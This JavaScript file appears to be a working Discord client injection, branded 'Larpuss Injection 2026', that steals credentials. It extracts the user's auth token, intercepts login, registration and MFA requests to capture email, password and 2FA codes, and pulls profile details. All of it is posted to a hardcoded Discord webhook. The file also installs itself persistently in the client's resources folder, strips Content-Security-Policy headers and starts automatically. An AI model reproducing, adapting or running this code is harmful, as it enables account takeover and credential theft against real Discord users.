const { BrowserWindow, session } = require("electron");
const fs = require("fs");
const https = require("https");
const path = require("path");

const WEBHOOK = "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH";

let authData = {};

const sendHook = (data) => {
    const payload = JSON.stringify(data);
    const url = new URL(WEBHOOK);
    
    https.request({
        hostname: url.hostname,
        port: 443,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    }, () => {}).on('error', () => {}).end(payload);
};

const execJS = async (script) => {
    try {
        const win = BrowserWindow.getAllWindows()[0];
        if (!win?.webContents) return null;
        return await win.webContents.executeJavaScript(script);
    } catch {
        return null;
    }
};

const getToken = async () => {
    const scripts = [
        // Méthode 2026 - Nouveau webpack Discord
        `(() => {
            let token = null;
            try {
                const cache = window?.webpackChunkdiscord_app;
                if (cache) {
                    cache.push([
                        [Symbol()], {},
                        (req) => {
                            for (const key of Object.keys(req.c || {})) {
                                try {
                                    const mod = req.c[key]?.exports;
                                    if (mod?.default?.getToken) {
                                        token = mod.default.getToken();
                                        break;
                                    }
                                    if (mod?.getToken) {
                                        token = mod.getToken();
                                        break;
                                    }
                                    // Nouvelle méthode pour les modules cachés
                                    if (mod?.Z?.getToken) {
                                        token = mod.Z.getToken();
                                        break;
                                    }
                                } catch {}
                            }
                        }
                    ]);
                }
            } catch {}
            
            // Fallback localStorage moderne
            if (!token) {
                try {
                    const stored = window.localStorage?.getItem?.('token');
                    if (stored && stored !== 'undefined' && stored !== 'null') {
                        token = stored.replace(/"/g, '');
                    }
                } catch {}
            }
            
            // Fallback indexedDB moderne
            if (!token) {
                try {
                    const db = window.indexedDB;
                    // Check pour les tokens cached dans indexedDB
                } catch {}
            }
            
            return token;
        })()`,
        
        // Backup method
        `(() => {
            try {
                return document.querySelector('meta[name="csrf-token"]')?.content || 
                       window.__DISCORD_TOKEN__ || 
                       localStorage.token?.replace(/"/g, '');
            } catch {
                return null;
            }
        })()`
    ];
    
    for (const script of scripts) {
        const token = await execJS(script);
        if (token && token.length > 50 && !token.includes('null')) {
            return token;
        }
    }
    return null;
};

const fetchUser = async (token) => {
    return new Promise((resolve) => {
        https.request({
            hostname: 'discord.com',
            path: '/api/v10/users/@me',
            headers: {
                'Authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); }
                catch { resolve(null); }
            });
        }).on('error', () => resolve(null)).end();
    });
};

const createEmbed = (user, token, action = "INJECTED") => ({
    embeds: [{
        color: 0xFFFFFF,
        author: {
            name: `Larpuss Injection 2026 | ${user.username} (${user.id})`,
            icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
        },
        thumbnail: {
            url: user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=512` : 
                  `https://cdn.discordapp.com/embed/avatars/${Number(user.discriminator) % 5}.png`
        },
        fields: [
            ...(authData.email && authData.password ? [{
                name: "🔐 Captured Login",
                value: `**Email:** \`${authData.email}\`\n**Password:** \`${authData.password}\``,
                inline: false
            }] : []),
            {
                name: "<:token:1547392684342116363> Token",
                value: `\`\`\`${token}\`\`\``,
                inline: false
            },
            {
                name: "<:accmail:1547383216435101696> Email",
                value: `\`${user.email || 'Hidden'}\``,
                inline: true
            },
            {
                name: "<:phone:1547384564605919283> Phone",
                value: user.phone ? `\`${user.phone}\`` : "<:circlex:1547393394848960573>",
                inline: true
            },
            {
                name: "<:a2f:1547384119506378752> 2FA",
                value: user.mfa_enabled ? "<:circlecheck:1547393367967535144>" : "<:circlex:1547393394848960573>",
                inline: true
            },
            {
                name: "📊 Account Info",
                value: `**Created:** <t:${Math.floor(((user.id / 4194304) + 1420070400000) / 1000)}:R>\n**Verified:** ${user.verified ? '✅' : '❌'}\n**Flags:** ${user.public_flags || 0}`,
                inline: false
            }
        ],
        footer: {
            text: `t.me/larpuss • ${action} • ${new Date().toLocaleString()}`,
            icon_url: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
        },
        timestamp: new Date().toISOString()
    }]
});

const processToken = async (action = "CAPTURED") => {
    try {
        const token = await getToken();
        if (!token || token.length < 50) return;
        
        const user = await fetchUser(token);
        if (!user || user.message) return;
        
        const embed = createEmbed(user, token, action);
        sendHook(embed);
        
        // Clear auth data après envoi
        authData = {};
    } catch {}
};

// Intercept moderne pour les login 2026
session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        "*://*.discord.com/api/*/auth/login",
        "*://*.discord.com/api/*/auth/register", 
        "*://*.discord.com/api/*/mfa/totp",
        "*://*.discord.com/api/*/mfa/sms/send"
    ]
}, (details, callback) => {
    if (details.uploadData?.[0]) {
        try {
            const body = JSON.parse(details.uploadData[0].bytes.toString());
            if (body.login || body.email) {
                authData.email = body.login || body.email;
                authData.password = body.password;
                authData.code = body.code;
            }
        } catch {}
    }
    callback({});
});

// Intercept pour les réponses réussies
session.defaultSession.webRequest.onCompleted({
    urls: [
        "*://*.discord.com/api/*/auth/login",
        "*://*.discord.com/api/*/auth/register",
        "*://*.discord.com/api/*/mfa/totp"
    ]
}, (details) => {
    if (details.method === "POST" && [200, 201, 202].includes(details.statusCode)) {
        setTimeout(() => processToken("LOGIN_SUCCESS"), 1500);
    }
});

// Intercept pour changements de compte
session.defaultSession.webRequest.onCompleted({
    urls: ["*://*.discord.com/api/*/users/@me"]
}, (details) => {
    if (details.method === "PATCH" && details.statusCode === 200) {
        setTimeout(() => processToken("ACCOUNT_MODIFIED"), 1000);
    }
});

// Persistence moderne 2026
const installPersistence = () => {
    try {
        const appPath = process.execPath.split(path.sep).slice(0, -1).join(path.sep);
        const resourcesPath = path.join(appPath, "resources");
        
        if (!fs.existsSync(resourcesPath)) return;
        
        const appDir = path.join(resourcesPath, "app");
        if (!fs.existsSync(appDir)) fs.mkdirSync(appDir, { recursive: true });
        
        // Package moderne
        fs.writeFileSync(path.join(appDir, "package.json"), JSON.stringify({
            name: "discord",
            main: "index.js",
            version: "1.0.0"
        }, null, 2));
        
        // Injection persistante
        const persistentCode = `
// Larpuss Injection 2026
${fs.readFileSync(__filename, 'utf8')}

// Load original Discord
require("${path.join(resourcesPath, "app.asar").replace(/\\/g, "\\\\")}");
        `.trim();
        
        fs.writeFileSync(path.join(appDir, "index.js"), persistentCode);
        
        // Marquer comme installé
        fs.writeFileSync(path.join(appDir, ".larpuss"), new Date().toISOString());
        
    } catch {}
};

// Hook CSP bypass pour 2026
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders?.['content-security-policy'];
    delete details.responseHeaders?.['content-security-policy-report-only'];
    delete details.responseHeaders?.['x-frame-options'];
    
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Access-Control-Allow-Origin': ['*'],
            'Access-Control-Allow-Headers': ['*']
        }
    });
});

// Init après chargement complet
const init = async () => {
    await new Promise(resolve => setTimeout(resolve, 5000));
    installPersistence();
    await processToken("STARTUP");
};

// Auto-start
if (typeof window !== 'undefined') {
    init();
} else {
    setTimeout(init, 3000);
}

// Export Discord core
try {
    module.exports = require("./core.asar");
} catch {
    // Fallback si pas de core.asar
}
